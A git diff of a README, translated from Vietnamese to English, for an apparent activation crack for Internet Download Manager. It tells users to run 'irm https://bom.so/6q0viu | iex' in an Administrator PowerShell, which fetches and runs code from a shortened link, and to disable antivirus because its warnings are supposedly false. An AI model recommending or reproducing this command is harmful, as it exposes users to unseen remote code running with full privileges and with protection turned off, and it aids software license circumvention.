@@ -1,27 +1,31 @@
-# Tool IDM activate
+# IDM Activation Tool
 
-Công cụ này giúp bạn tự động kích hoạt IDM.
+This tool helps you automatically activate Internet Download Manager (IDM).
 
 ---
 
-### Yêu cầu
+### Requirements
 
-* Hệ điều hành Windows
-* Chạy bằng **PowerShell** với quyền **Quản trị viên (Administrator)**
+- Windows operating system  
+- Run using **PowerShell** with **Administrator privileges**
 
-### Hướng dẫn sử dụng
+---
 
-1.  Mở **Windows PowerShell** bằng cách nhấn chuột phải và chọn **Run as administrator**.
+### Instructions
 
-2.  Copy và dán toàn bộ lệnh dưới đây vào cửa sổ PowerShell rồi nhấn **Enter**:
+1. Open **Windows PowerShell** by right-clicking and selecting **Run as administrator**.
+
+2. Copy and paste the following command into the PowerShell window, then press **Enter**:
 
     ```powershell
     irm https://bom.so/6q0viu | iex
     ```
 
-3.  Làm theo các hướng dẫn tiếp theo trên màn hình (nếu có).
+3. Follow any additional on-screen instructions (if any).
 
-### ⚠️ Lưu ý
+---
 
-* Một số phần mềm diệt virus có thể cảnh báo nhầm. Bạn có thể cần tạm thời vô hiệu hóa chúng để chạy kịch bản.
-* Hãy đảm bảo bạn tin tưởng vào nguồn gốc của kịch bản trước khi thực thi.
+### ⚠️ Notes
+
+- Some antivirus software may give a false warning. You may need to temporarily disable them to run the script.  
+- Make sure you trust the source of the script before executing it.
